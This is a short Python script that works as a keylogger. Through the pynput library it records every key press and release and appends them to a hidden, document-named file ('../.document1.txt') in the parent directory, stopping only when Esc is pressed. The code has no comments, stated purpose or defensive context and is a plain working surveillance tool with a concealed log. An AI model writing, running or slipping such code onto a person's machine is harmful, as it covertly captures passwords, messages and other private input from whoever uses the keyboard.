import os
import platform
from pynput.keyboard import Listener,Key

def get_platform():
    return platform.system()

def on_press(key):
    if key == Key.esc:
            return False
    keyFormat = "key_press:{0}\n".format(key)
    with open('../.document1.txt','+a') as file:
        file.write(keyFormat)

def on_release(key):
    if key == Key.esc:
            return False
    keyFormat = "key_release{0}\n".format(key)
    with open('../.document1.txt','+a') as file:
        file.write(keyFormat)

def listen_keyboard():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
